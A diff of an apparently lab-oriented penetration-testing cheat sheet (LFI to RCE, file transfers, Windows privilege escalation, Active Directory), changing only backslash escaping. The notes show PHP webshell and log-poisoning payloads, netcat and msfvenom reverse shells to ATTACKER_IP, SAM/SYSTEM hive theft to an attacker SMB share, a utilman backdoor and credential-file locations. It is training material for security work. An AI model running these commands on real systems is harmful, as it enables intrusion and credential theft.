@@ -200,12 +200,12 @@ Window scan <span class="cmd">-sW</span> : checks window field of rst packet, so
 ## Extract strings
 
 Extract strings from the above downloaded docs  
-<span class="cmd">for f in $(find [folder_with_files] -name '*.pdf'); do strings -n 5 "$f" | grep -vP '^[/&lt;&gt;%0-9\\\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' &gt;&gt; raw_words.txt; done</span>
+<span class="cmd">for f in $(find [folder_with_files] -name '*.pdf'); do strings -n 5 "$f" | grep -vP '^[/&lt;&gt;%0-9\\\\\\\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' &gt;&gt; raw_words.txt; done</span>
 
 ## Extract Emails from pdfs
 
 Extract emails from above downloaded docs  
-<span class="cmd">grep -RhiaoP '[A-Za-z0-9._%+-]+@[domain]\\.com' [folder_with_files] &gt; emails_docs.txt</span>  
+<span class="cmd">grep -RhiaoP '[A-Za-z0-9._%+-]+@[domain]\\\\.com' [folder_with_files] &gt; emails_docs.txt</span>  
 <span class="cmd">sort -u emails_docs.txt &gt; emails_docs.unique.txt</span>  
 <span class="cmd">grep -Po '^[^@]+' emails_docs.unique.txt &gt; users_from_emails.txt</span>
 
@@ -238,7 +238,7 @@ Interactive mode, answer the questions`,
 
 ## Normalise filter
 
-<span class="cmd">cat [combined] | tr '[:upper:]' '[:lower:]' | tr -d '\\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u &gt; [combined_clean]</span>  
+<span class="cmd">cat [combined] | tr '[:upper:]' '[:lower:]' | tr -d '\\\\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u &gt; [combined_clean]</span>  
 Converts uppercase to lowercase  
 Strips windows carriage returns  
 Removes noise strings, only: that start with an alphanumeric character, then allow letters, digits, dots, underscores or dashes, and are at least five characters long.`,
@@ -335,7 +335,7 @@ else: <span class="cmd">-u</span> can have the domain name directly, rather than
 
 ### GET
 
-Add FUZZ in the URL itself (escape <span class="cmd">&amp;</span> with <span class="cmd">\\</span> if needed: <span class="cmd">\\&amp;param=FUZZ</span> )
+Add FUZZ in the URL itself (escape <span class="cmd">&amp;</span> with <span class="cmd">\\\\</span> if needed: <span class="cmd">\\\\&amp;param=FUZZ</span> )
 
 ### POST: additional headers with data
 
@@ -389,7 +389,7 @@ Cookies can also be mentioned in the header:
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">curl -b 'sessionid=somevalue' http://MACHINE_IP:port or</span>  
 <span class="cmd">	curl -H ‘Cookie: sessionid=somevalue’ http://MACHINE_IP:port</span>
 
-Note: In WINDOWS: only double quotes must be used and quotes inside data must be escaped: \\"
+Note: In WINDOWS: only double quotes must be used and quotes inside data must be escaped: \\\\"
 
 ### Content types:
 
@@ -833,7 +833,7 @@ This is stored in the table<span class="cmd"> global_variables</span> in <span c
 • Use load_file to read the server configuration:  
 &nbsp;&nbsp;&nbsp;&nbsp;Apache:  <span class="cmd">/etc/apache2/apache2.conf</span>  
 &nbsp;&nbsp;&nbsp;&nbsp;Nginx's:<span class="cmd"> /etc/nginx/nginx.conf</span>  
-&nbsp;&nbsp;&nbsp;&nbsp;IIS:  <span class="cmd">%WinDir%\\System32\\Inetsrv\\Config\\ApplicationHost.config</span>  
+&nbsp;&nbsp;&nbsp;&nbsp;IIS:  <span class="cmd">%WinDir%\\\\System32\\\\Inetsrv\\\\Config\\\\ApplicationHost.config</span>  
 • Check the files that are included in this file or google it.
 
 ### SELECT INTO OUTFILE
@@ -879,7 +879,7 @@ Commonly targeted files on both and Windows systems.
 | /var/log/dmessage | Contains global system messages, including messages logged during system startup. |  
 | /var/mail/root | Contains all emails for the root user. |  
 | /var/log/apache2/access.log | Logs all requests made to the Apache web server. |  
-| C:\\boot.ini | Contains boot options for Windows computers with  firmware. |
+| C:\\\\boot.ini | Contains boot options for Windows computers with  firmware. |
 
 # File Disclosure using LFI
 
@@ -990,7 +990,7 @@ Eg:
 <span class="cmd">curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://[MACHINE_IP]:[PORT]/index.php?language=php://input&amp;cmd=id"</span>  
 • To pass commands like <span class="cmd">ls /</span> or <span class="cmd">cat flag.txt</span>, URL encode 'space' with <span class="cmd">+</span> or <span class="cmd">%20</span>  
 • To pass the command as GET parameter, <span class="cmd">$_REQUEST</span> (GET request) must be enabled/used. If only POST is enabled: Pass the command directly in PHP code:  
-Eg: <span class="cmd">&lt;\\?php system('id')?&gt;</span>
+Eg: <span class="cmd">&lt;\\\\?php system('id')?&gt;</span>
 
 ### Expect
 
@@ -1039,7 +1039,7 @@ Because Windows treats files on remote SMB servers as normal files
 • Start SMB server:  
 <span class="cmd">impacket-smbserver -smb2support share $(pwd)</span>  
 • Include the PHP script by using UNC path:  
-<span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=\\\\[PORT]\\share\\shell.php&amp;cmd=whoami </span>  
+<span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=\\\\\\\\[PORT]\\\\share\\\\shell.php&amp;cmd=whoami </span>  
 NOTE: This technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
 
 # LFI and File Uploads
@@ -1094,9 +1094,9 @@ Obsolete LFI attack: LFI + uploads enabled + old PHP + exposed phpinfo() then: [
 Writing PHP code into a field that gets logged, then including that log file via LFI to execute it. Requires the app to have read privileges over the log file.
 
 **PHP Session Poisoning**  
-General info: Most PHP web applications utilize <span class="cmd">PHPSESSID</span> cookies, which can hold specific user-related data, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in <span class="cmd">/var/lib/php/sessions/</span> on Linux and in <span class="cmd">C:\\Windows\\Temp\\</span> on Windows. The name of the file that contains our user's data matches the name of our <span class="cmd">PHPSESSID</span> cookie with the <span class="cmd">sess_</span> prefix.  
+General info: Most PHP web applications utilize <span class="cmd">PHPSESSID</span> cookies, which can hold specific user-related data, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in <span class="cmd">/var/lib/php/sessions/</span> on Linux and in <span class="cmd">C:\\\\Windows\\\\Temp\\\\</span> on Windows. The name of the file that contains our user's data matches the name of our <span class="cmd">PHPSESSID</span> cookie with the <span class="cmd">sess_</span> prefix.  
 • Check for cookie named PHPSESSID  
-• File will be stored at <span class="cmd">/var/lib/php/sessions/sess_[cookie_value]</span> or <span class="cmd">C:\\Windows\\Temp\\sess_[cookie_value] </span>  
+• File will be stored at <span class="cmd">/var/lib/php/sessions/sess_[cookie_value]</span> or <span class="cmd">C:\\\\Windows\\\\Temp\\\\sess_[cookie_value] </span>  
 • Include the session file through LFI  
 <span class="cmd">/var/lib/php/sessions/sess_[cookie_value]</span>  
 Eg: <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=/var/lib/php/sessions/sess_[cookie_value]</span>  
@@ -1114,15 +1114,15 @@ General ino: Both Apache and Nginx maintain log files, such as <span class="cmd"
 &nbsp;&nbsp;&nbsp;&nbsp;Nginx logs are readable by low privileged users by default (e.g. www-data).   
 &nbsp;&nbsp;&nbsp;&nbsp;Apache logs are only readable by high privileged users (e.g. root/adm groups). In older or misconfigured servers, these may be readable by low-privileged users.  
 Location:  
-&nbsp;&nbsp;&nbsp;&nbsp;Apache logs: <span class="cmd">/var/log/apache2/</span> or <span class="cmd">C:\\xampp\\apache\\logs\\</span>  
-&nbsp;&nbsp;&nbsp;&nbsp;Nginx logs: <span class="cmd">/var/log/nginx/</span> or <span class="cmd">C:\\nginx\\log\\</span>  
+&nbsp;&nbsp;&nbsp;&nbsp;Apache logs: <span class="cmd">/var/log/apache2/</span> or <span class="cmd">C:\\\\xampp\\\\apache\\\\logs\\\\</span>  
+&nbsp;&nbsp;&nbsp;&nbsp;Nginx logs: <span class="cmd">/var/log/nginx/</span> or <span class="cmd">C:\\\\nginx\\\\log\\\\</span>  
 • Try including a log file in the vulnerable parameter  
 Eg: <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?[parameter]=/var/log/apache2/access.log</span>  
 Tip: Logs tend to be huge, so it might take some time to load, or may even crash sometimes.  
 • Intercept the LFI request on Burpsuite and change the <span class="cmd">User-Agent</span> header to "Log poisoning"  
 • Include the log file again to see if is shows up in the log file.  
 • Now poison the header with a webshell in Burpsuite or terminal:  
-<span class="cmd">echo -n "User-Agent: &lt;?php system(\\$_GET['cmd']); ?&gt;" &gt; poison</span>  
+<span class="cmd">echo -n "User-Agent: &lt;?php system(\\\\$_GET['cmd']); ?&gt;" &gt; poison</span>  
 <span class="cmd">curl -s "http://[MACHINE_IP]:[PORT]/index.php" -H @poison</span>  
 • Execute the command  
 <span class="cmd">curl -s "http://[MACHINE_IP]:[PORT]/var/log/apache2/access.log&amp;cmd=id"</span>
@@ -1562,14 +1562,14 @@ Create a PowerShell Remoting Session
 <span class="cmd">$Session = New-PSSession -ComputerName [hostname_of_target]</span>
 
 Copy samplefile.txt from our Localhost to the target hostname session  
-<span class="cmd">Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\</span>  
+<span class="cmd">Copy-Item -Path C:\\\\samplefile.txt -ToSession $Session -Destination C:\\\\Users\\\\Administrator\\\\Desktop\\\\</span>  
 Copy DATABASE.txt from target hostname Session to our Localhost  
-<span class="cmd">Copy-Item -Path "C:\\Users\\Administrator\\Desktop\\DATABASE.txt" -Destination C:\\ -FromSession $Session</span>
+<span class="cmd">Copy-Item -Path "C:\\\\Users\\\\Administrator\\\\Desktop\\\\DATABASE.txt" -Destination C:\\\\ -FromSession $Session</span>
 
 ## RDP
 
 We can transfer files using RDP by copying and pasting.  
-To access the directory, we can connect to \\\\tsclient\\  
+To access the directory, we can connect to \\\\\\\\tsclient\\\\  
 Mounting a Linux Folder Using rdesktop  
 <span class="cmd">rdesktop [MACHINE_IP] -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'</span>  
 Mounting a Linux Folder Using xfreerdp  
@@ -1585,7 +1585,7 @@ Mounting a Linux Folder Using xfreerdp
 ### Get the md5 hash - for verification
 
 <span class="cmd">md5sum id_rsa</span>  
-<span class="cmd">Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5</span>
+<span class="cmd">Get-FileHash C:\\\\Users\\\\Public\\\\id_rsa -Algorithm md5</span>
 
 ### Encode to base64 - attacker
 
@@ -1594,7 +1594,7 @@ Mounting a Linux Folder Using xfreerdp
 
 ### Decode from base64 - target
 
-<span class="cmd">[IO.File]::WriteAllBytes("C:\\Users\\Public\\decode_file", [Convert]::FromBase64String("base64_text"))</span>
+<span class="cmd">[IO.File]::WriteAllBytes("C:\\\\Users\\\\Public\\\\decode_file", [Convert]::FromBase64String("base64_text"))</span>
 
 ## Powershell Download
 
@@ -1627,9 +1627,9 @@ Instead of downloading a PowerShell script to disk, we can run it directly in me
 
 ### Mount the SMB server with username and passwd - target
 
-<span class="cmd">net use n: \\\\[ATTACKER_IP]\\share /user:test test</span>  
+<span class="cmd">net use n: \\\\\\\\[ATTACKER_IP]\\\\share /user:test test</span>  
 Copy file from SMB server - target  
-<span class="cmd">copy \\\\[ATTACKER_IP]\\share\\nc.exe</span>
+<span class="cmd">copy \\\\\\\\[ATTACKER_IP]\\\\share\\\\nc.exe</span>
 
 ## FTP Download
 
@@ -1642,7 +1642,7 @@ If the shell we get is not interactive as we might have to log in
 
 ### Transfer files from FTP Server
 
-<span class="cmd">(New-Object Net.WebClient).DownloadFile('ftp://[MACHINE_IP]/[file.txt]', 'C:\\Users\\Public\\ftp-file.txt')</span>
+<span class="cmd">(New-Object Net.WebClient).DownloadFile('ftp://[MACHINE_IP]/[file.txt]', 'C:\\\\Users\\\\Public\\\\ftp-file.txt')</span>
 
 # Upload
 
@@ -1651,7 +1651,7 @@ If the shell we get is not interactive as we might have to log in
 ### Get the md5 hash - for verification
 
 <span class="cmd">md5sum id_rsa</span>  
-<span class="cmd">Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5</span>
+<span class="cmd">Get-FileHash C:\\\\Users\\\\Public\\\\id_rsa -Algorithm md5</span>
 
 ### Encode to base64 - target
 
@@ -1692,13 +1692,13 @@ If no restrictions: Use impacket-smbserver : in download
 
 ### Connect to WebDAV share - attacker
 
-<span class="cmd">dir \\\\192.168.49.128\\DavWWWRoot</span>  
+<span class="cmd">dir \\\\\\\\192.168.49.128\\\\DavWWWRoot</span>  
 DavWWWRoot : Special keyword recognised by windows shell, it doesn't exit. Replace it with the folder name shown when above command is run
 
 ### Upload files using SMB
 
-<span class="cmd">copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\[MACHINE_IP]\\DavWWWRoot\\</span>  
-<span class="cmd">copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\[MACHINE_IP]\\sharefolder\\</span>
+<span class="cmd">copy C:\\\\Users\\\\john\\\\Desktop\\\\SourceCode.zip \\\\\\\\[MACHINE_IP]\\\\DavWWWRoot\\\\</span>  
+<span class="cmd">copy C:\\\\Users\\\\john\\\\Desktop\\\\SourceCode.zip \\\\\\\\[MACHINE_IP]\\\\sharefolder\\\\</span>
 
 ## FTP Upload
 
@@ -1708,7 +1708,7 @@ DavWWWRoot : Special keyword recognised by windows shell, it doesn't exit. Repla
 
 ### PowerShell Upload File
 
-<span class="cmd">(New-Object Net.WebClient).UploadFile('ftp://[MACHINE_IP]/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')</span>
+<span class="cmd">(New-Object Net.WebClient).UploadFile('ftp://[MACHINE_IP]/ftp-hosts', 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts')</span>
 
 # Living Off the land
 
@@ -1720,7 +1720,7 @@ DavWWWRoot : Special keyword recognised by windows shell, it doesn't exit. Repla
                 body: `Powershell script:  
 <span class="cmd">wget </span><span class="cmd">[https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)</span>  
 Download and import it:  
-<span class="cmd">Import-Module .\\Invoke-AESEncryption.ps1</span>
+<span class="cmd">Import-Module .\\\\Invoke-AESEncryption.ps1</span>
 
 ## Strings
 
@@ -1786,7 +1786,7 @@ Decrypts the file
 
 ### HTTP GET Request
 
-<span class="cmd">echo -e "GET /[file] HTTP/1.1\\n\\n"&gt;&amp;3</span>
+<span class="cmd">echo -e "GET /[file] HTTP/1.1\\\\n\\\\n"&gt;&amp;3</span>
 
 ### Print the Response
 
@@ -2162,16 +2162,16 @@ Special built in accounts: Created and managed by windows but possible access to
 
 ### Unattended windows installations, possible locations of password storage:
 
-<span class="cmd">C:\\Unattend.xml</span>  
-<span class="cmd">C:\\Windows\\Panther\\Unattend.xml</span>  
-<span class="cmd">C:\\Windows\\Panther\\Unattend\\Unattend.xml</span>  
-<span class="cmd">C:\\Windows\\system32\\sysprep.inf</span>  
-<span class="cmd">C:\\Windows\\system32\\sysprep\\sysprep.xml</span>
+<span class="cmd">C:\\\\Unattend.xml</span>  
+<span class="cmd">C:\\\\Windows\\\\Panther\\\\Unattend.xml</span>  
+<span class="cmd">C:\\\\Windows\\\\Panther\\\\Unattend\\\\Unattend.xml</span>  
+<span class="cmd">C:\\\\Windows\\\\system32\\\\sysprep.inf</span>  
+<span class="cmd">C:\\\\Windows\\\\system32\\\\sysprep\\\\sysprep.xml</span>
 
 ### Powershell History
 
 cmd prompt:  
-<span class="cmd">type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt</span>  
+<span class="cmd">type %userprofile%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadline\\\\ConsoleHost_history.txt</span>  
 powershell: replace <span class="cmd">%userprofile%</span> with <span class="cmd">$Env:userprofile</span>
 
 ### Saved windows creds
@@ -2184,15 +2184,15 @@ Run as above used if found with <span class="cmd">/savecred</span> option
 ### IIS Configuration (databases)
 
 website config stored in <span class="cmd">web.config</span>, possible locations:  
-<span class="cmd">C:\\inetpub\\wwwroot\\web.config</span>  
-<span class="cmd">C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config</span>  
+<span class="cmd">C:\\\\inetpub\\\\wwwroot\\\\web.config</span>  
+<span class="cmd">C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Config\\\\web.config</span>  
 find db connection strings in the file:  
-<span class="cmd">type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString</span>
+<span class="cmd">type C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\Config\\\\web.config | findstr connectionString</span>
 
 ### PuTTY retrieval of creds
 
 Stores proxy configurations that include cleartext authentication credentials.  
-<span class="cmd">reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f "Proxy" /s</span>
+<span class="cmd">reg query HKEY_CURRENT_USER\\\\Software\\\\SimonTatham\\\\PuTTY\\\\Sessions\\\\ /f "Proxy" /s</span>
 
 ## Scheduled tasks
 
@@ -2203,7 +2203,7 @@ Main things: "Task to run" and "Run as User" : this should be something other th
 
 • To see if that task can be modified (the one mentioned in **task to run** above):  
 <span class="cmd">icacls [full_file_path]</span>  
-• If BUILTIN\\Users group has full access (F), then we can modify it with any payload:  
+• If BUILTIN\\\\Users group has full access (F), then we can modify it with any payload:  
 <span class="cmd">echo [nc64.exe file location] -e cmd.exe [ATTACKER_IP] [4444] &gt; [full_file_path]</span>  
 ^ it is netcat  
 • Start listener on our system : <span class="cmd">nc -nlvp 4444</span>  
@@ -2214,19 +2214,19 @@ NOTE: we are modifying the file mentioned in the task to run field, not the task
 
 Windows installer files (.msi) may be configured to run with higher privileges from any user account  
 • 2 registry bits must be set:  
-<span class="cmd">reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</span>  
-<span class="cmd">reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</span>  
+<span class="cmd">reg query HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer</span>  
+<span class="cmd">reg query HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer</span>  
 • If yes then Generate payload:  
 <span class="cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[LOCAL_PORT] -f msi -o malicious.msi</span>  
 Transfer it to the target and run the following in the target:  
-<span class="cmd">msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi</span>
+<span class="cmd">msiexec /quiet /qn /i C:\\\\Windows\\\\Temp\\\\malicious.msi</span>
 
 ## Abusing Service Misconfigurations
 
 Service control manager (SCM): Process in charge of managing the state of services  
 Check service config of a service: <span class="cmd">sc qc [service_name]</span>  
 Powershell: <span class="cmd">sc.exe</span> ; since sc is Set-Content in PS  
-Service conf stored in registry: <span class="cmd">HKLM\\SYSTEM\\CurrentControlSet\\Services\\</span>  
+Service conf stored in registry: <span class="cmd">HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\</span>  
 Associated executable on **ImagePath**  
 Account used to start the service on **ObjectName**
 
@@ -2251,9 +2251,9 @@ You have shell with that user's privilege
 • Check for spaces in the **BINARY_PATH_NAME** without quotes  
 Usually spaces are used as argument separators unless they are part of a quoted string.  
 For eg: Disk sorter enterprise :   
-&nbsp;&nbsp;&nbsp;&nbsp;First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.   
-&nbsp;&nbsp;&nbsp;&nbsp;If not, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.  
-&nbsp;&nbsp;&nbsp;&nbsp;If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\\\bin\\disksrs.exe.  
+&nbsp;&nbsp;&nbsp;&nbsp;First, search for C:\\\\MyPrograms\\\\Disk.exe. If it exists, the service will run this executable.   
+&nbsp;&nbsp;&nbsp;&nbsp;If not, it will then search for C:\\\\MyPrograms\\\\Disk Sorter.exe. If it exists, the service will run this executable.  
+&nbsp;&nbsp;&nbsp;&nbsp;If the latter doesn't exist, it will then search for C:\\\\MyPrograms\\\\Disk Sorter Enterprise\\\\\\\\bin\\\\disksrs.exe.  
 • Check the folder permissions in which the unquoted path is present, here: MyPrograms  
 • Using **exe-service** format, generate payload and name it as the **first word of the path** and then transfer it to the same folder.  
 • Run it using sc, with full service name
@@ -2263,7 +2263,7 @@ For eg: Disk sorter enterprise :
 If the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service.   
 • Check for a service DACL. tool: [https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)  
 <span class="cmd">	accesschk64.exe -lc [service_name]</span>  
-If BUILTIN\\\\Users group has the SERVICE_ALL_ACCESS permission, then any user can reconfigure the service.  
+If BUILTIN\\\\\\\\Users group has the SERVICE_ALL_ACCESS permission, then any user can reconfigure the service.  
 • Using **exe-service** format, generate payload and transfer it  
 • Change the service's associated executable and account, localSystem is highest privileged account  
 <span class="cmd">	sc config [service_name] binPath= "[location of payload]" obj= LocalSystem</span>
@@ -2278,15 +2278,15 @@ List your privileges:
 
 Allow users to read and write to any file in the system, ignoring any DACL in place. Idea: Allow certain users to perform backups from a system without requiring full administrative privileges.  
 • Backup the SAM and SYSTEM hashes in the target:  
-<span class="cmd">reg save hklm\\system C:\\Users\\THMBackup\\system.hive</span>  
-<span class="cmd">reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive</span>  
+<span class="cmd">reg save hklm\\\\system C:\\\\Users\\\\THMBackup\\\\system.hive</span>  
+<span class="cmd">reg save hklm\\\\sam C:\\\\Users\\\\THMBackup\\\\sam.hive</span>  
 • Creates a couple of files with the registry hives content and copy these files to our machine. In our system:  
 <span class="cmd">mkdir share</span>  
 <span class="cmd">python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username [username] -password [password] public share</span>  
 share: any folder in our system, username and password in the target system  
 • In the target:  
-<span class="cmd">copy C:\\Users\\[username]\\sam.hive \\\\[OUR_IP]\\public\\</span>  
-<span class="cmd">copy C:\\Users\\[username]\\system.hive \\\\[OUR_IP]\\public\\</span>  
+<span class="cmd">copy C:\\\\Users\\\\[username]\\\\sam.hive \\\\\\\\[OUR_IP]\\\\public\\\\</span>  
+<span class="cmd">copy C:\\\\Users\\\\[username]\\\\system.hive \\\\\\\\[OUR_IP]\\\\public\\\\</span>  
 • Retrieve the users' password hashes inside share directory:  
 <span class="cmd">python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</span>  
 • Perform a Pass-the-Hash attack:  
@@ -2297,9 +2297,9 @@ share: any folder in our system, username and password in the target system
 Allows a user to take ownership of any object on the system, including files and registry keys  
 utilman.exe: Built-in Windows application used to provide Ease of Access options during the lock screen, run with SYSTEM privileges  
 • Take ownership of utilman.exe:  
-<span class="cmd">takeown /f C:\\Windows\\System32\\Utilman.exe</span>  
+<span class="cmd">takeown /f C:\\\\Windows\\\\System32\\\\Utilman.exe</span>  
 • Give your user full permissions over utilman.exe:  
-<span class="cmd">icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F</span>  
+<span class="cmd">icacls C:\\\\Windows\\\\System32\\\\Utilman.exe /grant THMTakeOwnership:F</span>  
 • Replace utilman.exe with a copy of cmd.exe:  
 <span class="cmd">copy cmd.exe utilman.exe</span>  
 • To trigger utilman, we will lock our screen from the start button:
@@ -2321,7 +2321,7 @@ IIS Webshell exploit using RogueWinRM:
 • Start a listener on your machine  
 • Upload the exploit of RogueWinRM: [https://github.com/antonioCoco/RogueWinRM/releases/download/1.1/RogueWinRM.zip](https://github.com/antonioCoco/RogueWinRM/releases/download/1.1/RogueWinRM.zip)  
 • Then run in the webshell:  
-<span class="cmd">[location_of]RogueWinRM.exe -p "C:\\tools\\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"</span>  
+<span class="cmd">[location_of]RogueWinRM.exe -p "C:\\\\tools\\\\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"</span>  
 -p : Executable to be run by the exploit  
 -a : Used to pass arguments to the executable
 
@@ -2365,11 +2365,11 @@ Match from ending: <span class="cmd">$</span>
 <span class="cmd">{1,10}</span> :  number or range, indicates how many times pattern must repeat  
 <span class="cmd">[^k]</span> : **excludes** character from charset
 
-<span class="cmd">\\w</span>: alphanumeric  
-<span class="cmd">\\d</span>: digit  
-<span class="cmd">\\s</span>: whitespace  
+<span class="cmd">\\\\w</span>: alphanumeric  
+<span class="cmd">\\\\d</span>: digit  
+<span class="cmd">\\\\s</span>: whitespace  
 **Capital of above is opp**, eg not alphanumeric, not digit and so on  
-<span class="cmd">.</span> : any character (to capture **.** use **\\.** that way it escapes it
+<span class="cmd">.</span> : any character (to capture **.** use **\\\\.** that way it escapes it
 
 <span class="cmd">* </span>: 0 or more  
 <span class="cmd">+</span> : 1 or more  
@@ -2669,9 +2669,9 @@ Where <span class="cmd">-operator</span> is a list of the following operators:
 
 ### Location of file and if file exists
 
-<span class="cmd">Get-ChildItem -Path C:\\ -Filter "[file_name]" -Recurse</span>  
+<span class="cmd">Get-ChildItem -Path C:\\\\ -Filter "[file_name]" -Recurse</span>  
 put * before and after of file_name if unsure about exact name.  
-<span class="cmd">Test-Path -Path "[C:\\Path\\To\\Item]"</span>  
+<span class="cmd">Test-Path -Path "[C:\\\\Path\\\\To\\\\Item]"</span>  
 File:<span class="cmd"> -PathType leaf</span>  
 Directory:<span class="cmd"> -PathTye container</span>
 
@@ -2847,7 +2847,7 @@ Execute a command as a different user:
 | size | -size +5k or -size -5k |  
 | name | -name *.conf or -name * .bak |  
 | Remove fails or errors | &gt; /dev/null |  
-| Execute command for the found file | -exec ls -al {} \\; 2&gt;/dev/null |  
+| Execute command for the found file | -exec ls -al {} \\\\; 2&gt;/dev/null |  
 | executable or not | -executable or ! -executable |
 
 Here, {} is placeholder for the file name backslash ; to escape the ;
@@ -2897,7 +2897,7 @@ LDAPS: 636
 
 The relationship between AD and LDAP can be compared to Apache and HTTP. The same way Apache is a web server that uses the HTTP protocol, Active Directory is a directory server that uses the LDAP protocol.
 
-Machine account (NT AUTHORITY\\SYSTEM) in AD: Has almost same rights as standard domain user account.  
+Machine account (NT AUTHORITY\\\\SYSTEM) in AD: Has almost same rights as standard domain user account.  
 &nbsp;&nbsp;&nbsp;&nbsp;Do not always need valid creds of individual user account to begin enumeration  
 &nbsp;&nbsp;&nbsp;&nbsp;Will allow read access to much of the data within the domain  
 &nbsp;&nbsp;&nbsp;&nbsp;May obtain SYSTEM level access to domain-joined windows host through RCE or privesc on a host
@@ -2955,7 +2955,7 @@ Group Policy Management Editor
 ## Manage computers:
 
 Add computers to a domain:  
-<span class="cmd">Add-Computer -DomainName INLANEFREIGHT.LOCAL -Credential INLANEFREIGHT\\HTB-student_adm -Restart</span>  
+<span class="cmd">Add-Computer -DomainName INLANEFREIGHT.LOCAL -Credential INLANEFREIGHT\\\\HTB-student_adm -Restart</span>  
 [https://academy.hackthebox.com/app/module/74/section/1393](https://academy.hackthebox.com/app/module/74/section/1393)`,
       },
       {
